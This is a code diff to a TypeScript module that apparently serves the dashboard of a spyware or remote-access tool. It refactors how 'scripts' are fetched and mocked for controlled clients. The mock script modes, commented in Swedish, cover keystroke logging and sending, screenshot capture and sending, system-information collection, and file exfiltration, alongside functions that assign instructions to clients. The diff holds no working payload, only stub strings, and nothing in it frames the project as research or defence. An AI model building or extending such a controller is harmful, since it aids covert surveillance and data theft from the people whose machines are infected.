@@ -1,3 +1,4 @@
+
 // Mock scripts data to use when API is not available
 export interface ScriptsData {
   [key: string]: string;
@@ -45,45 +46,28 @@ const MOCK_CLIENTS: ClientInstruction[] = [
   }
 ];
 
-// Get available scripts from the server or use mock data if API fails
-export async function getScripts(): Promise<ScriptsData> {
-  try {
-    const response = await fetch('/api/scripts');
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
-    }
-    const data = await response.json();
-    return data;
-  } catch (error) {
-    console.error("Error fetching scripts:", error);
-    
-    // Use local data from instructions.py if API fails
-    const scripts = await extractScriptsFromInstructionsPy();
-    return scripts;
-  }
-}
+// Mock scripts data to use when API is not available
+const MOCK_SCRIPTS_DATA: ScriptsData = {
+  "standard": "# Standard instruktioner - logga tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
+  "keylogger": "# Instruktion: Keylogger-läge - Registrera och skicka tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
+  "screenshot": "# Instruktion: Screenshot-läge - Ta och skicka skärmdumpar\nimport platform\nimport getpass\n# ... more code here",
+  "system_info": "# Instruktion: System Info-läge - Samla och skicka systeminformation\nimport platform\nimport getpass\n# ... more code here",
+  "file_exfiltration": "# Instruktion: File Exfiltration-läge - Hitta och exfiltrera specifika filtyper\nimport platform\nimport getpass\n# ... more code here",
+};
 
 // Extract scripts from instructions.py
 export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
   // In a real app, this would parse the Python file server-side
   // For now, we're returning mock data based on the file content
   try {
-    // Import the instructions.py data
-    // This is a mock - in a real app, this would be a proper API call
-    const response = await import('../scripts/instructions.py');
+    // This is a mock - in a real app, this would be a proper API call to get Python content
     console.log("Mock import of instructions.py");
     
-    // Mock data extraction from instructions.py
-    return {
-      "standard": "# Standard instruktioner - logga tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
-      "keylogger": "# Instruktion: Keylogger-läge - Registrera och skicka tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
-      "screenshot": "# Instruktion: Screenshot-läge - Ta och skicka skärmdumpar\nimport platform\nimport getpass\n# ... more code here",
-      "system_info": "# Instruktion: System Info-läge - Samla och skicka systeminformation\nimport platform\nimport getpass\n# ... more code here",
-      "file_exfiltration": "# Instruktion: File Exfiltration-läge - Hitta och exfiltrera specifika filtyper\nimport platform\nimport getpass\n# ... more code here",
-    };
+    // Return the mock data directly
+    return MOCK_SCRIPTS_DATA;
   } catch (error) {
     console.error("Error extracting scripts:", error);
-    // Fallback to hard-coded values if import fails
+    // Fallback to simplified values if needed
     return {
       "standard": "# Standard instruktioner - logga tangenttryckningar",
       "keylogger": "# Instruktion: Keylogger-läge",
@@ -91,6 +75,34 @@ export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
       "system_info": "# Instruktion: System Info-läge",
       "file_exfiltration": "# Instruktion: File Exfiltration-läge",
     };
+  }
+}
+
+/**
+ * Get scripts data from API or fallback to mock data
+ * @returns {Promise<ScriptsData>} The scripts data
+ */
+export async function getScripts(): Promise<ScriptsData> {
+  try {
+    const response = await fetch('/api/scripts');
+    
+    if (!response.ok) {
+      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
+    }
+    
+    try {
+      const data = await response.json();
+      return data;
+    } catch (error) {
+      console.warn("API returned non-JSON response, using mock data instead");
+      return MOCK_SCRIPTS_DATA;
+    }
+  } catch (error) {
+    console.error("Error fetching scripts:", error);
+    
+    // Use local mock data if API fails
+    const scripts = await extractScriptsFromInstructionsPy();
+    return scripts;
   }
 }
 
@@ -143,28 +155,3 @@ export async function updateClientInstruction(clientId: string, instructionId: s
     return true;
   }
 }
-
-/**
- * Get scripts data
- * @returns {Promise<ScriptsData>} The scripts data
- */
-export const getScripts = async (): Promise<ScriptsData> => {
-  try {
-    const response = await fetch('/api/scripts');
-    
-    if (!response.ok) {
-      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
-    }
-    
-    try {
-      const data = await response.json();
-      return data;
-    } catch (error) {
-      console.warn("API returned non-JSON response, using mock data instead");
-      return mockScriptsData;
-    }
-  } catch (error) {
-    console.warn("Failed to fetch from API, using mock data instead:", error);
-    return mockScriptsData;
-  }
-};
